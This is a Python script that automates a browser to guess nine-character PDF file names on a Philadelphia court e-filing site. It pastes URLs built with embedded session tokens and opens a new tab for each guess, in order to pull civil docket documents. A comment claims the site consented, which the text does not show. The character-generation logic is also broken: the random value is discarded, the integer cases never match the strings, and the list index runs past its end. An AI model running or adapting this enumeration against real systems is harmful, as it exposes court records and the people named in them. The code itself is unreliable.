import time
import random
import keyboard
from keyboard import is_pressed
import pyperclip

COOLDOWN = .1 #Time inbetween presses in seconds
UID = "D14ZTsnFBIolqsSYDxam" #Each person needs to input their own user ID here. It will change around every 1-2 days. What you see is probably mine
o = "M6aaK2g8XxozKg8" #You also have your own o. I dunno what it is or what it does but you have to put it in every 1-2 days

# The Purpose of this code is to create random 9 digit pdf codes to try and crack random
# FJDEFILE civil docket PDFs
# THIS CODE WAS MADE WITH CONSENT OF FJDEFILE AND ANY USE IN AN ATTEMPT TO GENUINELY BRING HARM TO SAID SERVICE IS NOT CONDONED

# example string:https://fjdefile.phila.gov/efsfjd/zk_fjd_public_qry_00.zp_add_to_cart?uid=D7aVUloK_IolqsSYDxam&o=Mcg6LVhdVxozKg8&c=240803528&d=2&b=1&tfn=a7hJKYIbL.pdf 


def main():
    close = True #Basically the loop
    a = False #automation because i dont want to mash spacebar. Dont tell anyone
    event = ""
    print("Do you want automation? if so press =, If not press anything WARNING: NOT RECOMMENDED TO QUIT YOU MUST HOLD SPACE UNTIL IT STOPS")
    automation = keyboard.read_key()
    if(automation == "="):
        a = True
        keyboard.write("\b")

    while(close): # This is the execution loop until you press \ it will generate a url with random tfn every space press
        print("Please Press Space while mounted to the URL bar to start, Press \ To Exit the code")
        if(a == False):
            event = keyboard.read_key() # tell what key is being pressed

        if(event == chr(92)):
            #escape code if they input \
            close = False
            exit() #prevents sleep from slowing down the quit and prevents code from doing a "one more loop"
        elif (event == "space" or a):
            #start url + random tfn code
            if(a and is_pressed("space")):#EMERGENCY BANDAID FIX HOLD SPACE TO QUIT AUTOMATION
                exit()
            hURL = "https://fjdefile.phila.gov/efsfjd/zk_fjd_public_qry_00.zp_add_to_cart?uid=" + UID + "&o=" + o + "&c=240501986&d=2&b=1&tfn="
            fURL = random_tfn(hURL)
            #keyboard.write(fURL)
            pyperclip.copy(fURL)
            keyboard.send("ctrl+v")
            keyboard.send("enter")
        else:
            #do nothing if they press any other key
            continue
        time.sleep(COOLDOWN) # seperate presses by X SECONDS
        # open a new tab
        keyboard.send("ctrl+t")

def random_tfn(hURL):
    # Creates a randomized tfn to append onto the url
    i = 0
    tfn = ""
    while(i<9):
        i += 1
        hit= random.randint(0,61)
        #cheating array to set hit numbers to an active code, I would put a quick key here but I can't count
        cheat = ["21","4","32","50","51","5","43","4","53"]
        hit = cheat[i]
        match hit: # Theres a lot here its just a random number gen and every number is associated with a character
            case 0:
               tfn +="0"
            case 1:
                tfn +="1"
            case 2:
                tfn +="2"
            case 3:
                tfn +="3"
            case 4:
                tfn +="4"
            case 5:
                tfn +="5"
            case 6:
                tfn +="6"
            case 7:
                tfn +="7"
            case 8:
                tfn +="8"
            case 9:
                tfn +="9"
            case 10:
                tfn +="q"
            case 11:
                tfn +="w"
            case 12:
                tfn +="e"
            case 13:
                tfn +="r"
            case 14:
                tfn +="t"
            case 15:
                tfn +="y"
            case 16:
                tfn +="u"
            case 17:
                tfn +="i"
            case 18:
                tfn +="o"
            case 19:
                tfn +="p"
            case 20:
                tfn +="s"
            case 21:
                tfn +="d"
            case 22:
                tfn +="f"
            case 23:
                tfn +="g"
            case 24:
                tfn +="h"
            case 25:
                tfn +="j"
            case 26:
                tfn +="k"
            case 27:
                tfn +="l"
            case 28:
                tfn +="z"
            case 29:
                tfn +="x"
            case 30:
                tfn +="c"
            case 31:
                tfn +="v"
            case 32:
                tfn +="b"
            case 33:
                tfn +="n"
            case 34:
                tfn +="m"
            case 35:
                tfn +="Q"
            case 36:
                tfn +="W"
            case 37:
                tfn +="E"
            case 38:
                tfn +="R"
            case 39:
                tfn +="T"
            case 40:
                tfn +="Y"
            case 41:
                tfn +="U"
            case 42:
                tfn +="I"
            case 43:
                tfn +="O"
            case 44:
                tfn +="P"
            case 45:
                tfn +="A"
            case 46:
                tfn +="S"
            case 47:
                tfn +="D"
            case 48:
                tfn +="F"
            case 49:
                tfn +="G"
            case 50:
                tfn += "H"
            case 51:
                tfn += "J"
            case 52:
                tfn += "K"
            case 53:
                tfn += "L"
            case 54:
                tfn += "Z"
            case 55:
                tfn += "X"
            case 56:
                tfn += "C"
            case 57:
                tfn += "V"
            case 58:
                tfn += "B"
            case 59:
                tfn += "N"
            case 60:
                tfn += "M"
            case 61:
                tfn += "a"
            case 62:
                tfn +=("HOW DID YOU DO THAT")
    tfn += ".pdf"
    #tfn ="q4YvTgH2N.pdf" testing with a working tfn making sure it works
    return hURL + tfn
if __name__ == "__main__":
    main()
